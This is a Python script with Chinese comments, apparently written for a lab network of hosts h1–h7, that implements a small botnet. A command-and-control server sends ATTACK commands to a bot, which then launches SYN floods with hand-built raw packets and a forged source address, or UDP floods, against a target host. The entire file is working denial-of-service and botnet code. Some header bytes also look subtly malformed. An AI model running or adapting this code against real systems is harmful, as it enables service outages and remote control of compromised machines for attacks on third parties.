import random
import sys
import time
import socket
import threading
import struct

# 配置参数
C2C_IP = "192.168.1.200"  # C&C 服务器 (h7) 的 IP
C2C_PORT = 4444  # 通信端口
TARGET_IP = "192.168.1.100"  # 攻击目标 (h1) 的 IP


def syn_attack(target_ip, target_port):
    """执行 SYN Flood 攻击"""
    try:
        # 创建原始 socket（需要 root 权限）
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        print(f"[SYN 攻击] 开始向 {target_ip}:{target_port} 发送 SYN 包")
        while True:
            # 使用真实源 IP 和随机端口
            src_port = random.randint(1024, 65535)
            # 构造 IP 头部
            ip_header = b"\x45\x00\x00\x28"  # IP 版本 + 头部长度 + 总长度
            ip_header += b"\x00\x00\x00\x00"  # 标识 + 标志 + 片偏移
            ip_header += b"\x40\x06\x00\x00"  # TTL (64) + 协议 (TCP) + 校验和
            # 注意：这里的src_ip将由调用函数传入
            ip_header += socket.inet_aton("192.168.1.102")  # h3的IP (SYN攻击机)
            ip_header += socket.inet_aton(target_ip)  # 目标 IP
            # 构造 TCP 头部（仅 SYN 包）
            tcp_header = struct.pack("!H", src_port)  # 源端口
            tcp_header += struct.pack("!H", target_port)  # 目标端口
            tcp_header += b"\x00\x00\x00\x00"  # 序列号
            tcp_header += b"\x00\x00\x00\x00"  # 确认号
            tcp_header += b"\x50\x02\x7fff"  # 数据偏移 + SYN 标志 + 窗口大小
            tcp_header += b"\x00\x00\x00\x00"  # 校验和 + 紧急指针
            # 发送 SYN 包
            sock.sendto(ip_header + tcp_header, (target_ip, target_port))
            time.sleep(0.001)  # 控制发送速率

    except Exception as e:
        print(f"[SYN 攻击错误] {str(e)}")


def udp_attack(target_ip, target_port):
    """执行 UDP Flood 攻击"""
    try:
        # 创建 UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 生成随机垃圾数据（1KB）
        payload = random._urandom(1024)

        print(f"[UDP 攻击] 开始向 {target_ip}:{target_port} 发送 UDP 包")
        while True:
            # 使用真实源端口
            src_port = random.randint(1024, 65535)
            
            # 发送 UDP 包 (使用h6的IP 192.168.1.105)
            sock.sendto(payload, (target_ip, target_port))
            time.sleep(0.001)  # 控制发送速率

    except Exception as e:
        print(f"[UDP 攻击错误] {str(e)}")


def handle_bot(client_socket, client_addr):
    """C&C 服务器：处理单个傀儡机连接（这里h6作为傀儡机）"""
    print(f"\n [新连接] 傀儡机 {client_addr} 已上线")

    try:
        # 接收傀儡机上线消息
        welcome_msg = client_socket.recv(1024).decode('utf-8')
        print(f"[傀儡机消息] {welcome_msg}")
        # 命令交互循环
        while True:
            command = input("\n 请输入命令（格式：\n"
                           "- 攻击：ATTACK 目标 IP 端口 攻击类型 (SYN/UDP)\n"
                           "- 示例：ATTACK 192.168.1.100 80 SYN\n"
                           "- 下线：EXIT\n"
                           "命令：")

            client_socket.send(command.encode('utf-8'))

            if command.strip().upper() == "EXIT":
                print("[操作] 已发送下线命令")
                break
            # 接收傀儡机响应
            response = client_socket.recv(1024).decode('utf-8')
            print(f"[傀儡机响应] {response}")

    except Exception as e:
        print(f"[通信错误] {str(e)}")
    finally:
        client_socket.close()
        print(f"[连接关闭] 与傀儡机 {client_addr} 断开连接")


def start_c2c_server():
    """启动 C&C 服务器（在h7上执行）"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server_socket.bind((C2C_IP, C2C_PORT))
        server_socket.listen(5)
        print(f"[C&C 服务器] 已启动，监听 {C2C_IP}:{C2C_PORT}")
        print("[提示] 按 Ctrl+C 停止服务器")

        while True:
            client_socket, client_addr = server_socket.accept()
            # 启动新线程处理傀儡机（h6）连接
            bot_thread = threading.Thread(target=handle_bot, args=(client_socket, client_addr))
            bot_thread.start()

    except KeyboardInterrupt:
        print("\n [服务器停止] 用户中断")
    except Exception as e:
        print(f"[服务器错误] {str(e)}")
    finally:
        server_socket.close()


def start_bot(bot_ip):
    """启动傀儡机客户端（在h6上执行，bot_ip为h6的IP：192.168.1.105）"""
    bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        bot_socket.connect((C2C_IP, C2C_PORT))
        bot_socket.send(f"傀儡机 {bot_ip} 已上线，等待命令".encode('utf-8'))

        attack_thread = None

        while True:
            command = bot_socket.recv(1024).decode('utf-8')
            if not command:
                break

            print(f"[收到命令] {command}")
            parts = command.split()
            # 解析攻击命令
            if parts[0].upper() == "ATTACK" and len(parts) == 4:
                target_ip = parts[1]
                target_port = int(parts[2])
                attack_type = parts[3].upper()
                # 启动攻击线程
                if attack_type == "SYN":
                    attack_thread = threading.Thread(target=syn_attack, args=(target_ip, target_port))
                elif attack_type == "UDP":
                    attack_thread = threading.Thread(target=udp_attack, args=(target_ip, target_port))
                else:
                    bot_socket.send("错误：不支持的攻击类型（仅支持 SYN/UDP）".encode('utf-8'))
                    continue

                attack_thread.daemon = True
                attack_thread.start()
                bot_socket.send(f"已开始 {attack_type} 攻击：{target_ip}:{target_port}".encode('utf-8'))
            # 解析下线命令
            elif parts[0].upper() == "EXIT":
                bot_socket.send("傀儡机已下线".encode('utf-8'))
                break

            else:
                bot_socket.send("错误：无效命令格式".encode('utf-8'))

    except Exception as e:
        print(f"[连接错误] {str(e)}")
    finally:
        bot_socket.close()
        print("[傀儡机] 已断开连接")


if __name__ == "__main__":
    # 通过命令行参数指定角色：server/bot
    if len(sys.argv) != 2 and len(sys.argv) != 3:
        print("用法：")
        print("启动 C&C 服务器（在 h7 上执行）：python3 botnet_attack.py server")
        print("启动傀儡机（在 h6 上执行）：python3 botnet_attack.py bot 192.168.1.105")
        sys.exit(1)

    role = sys.argv[1].lower()
    if role == "server":
        start_c2c_server()
    elif role == "bot" and len(sys.argv) == 3:
        bot_ip = sys.argv[2]
        start_bot(bot_ip)
    else:
        print("参数错误，请检查输入")
        sys.exit(1)
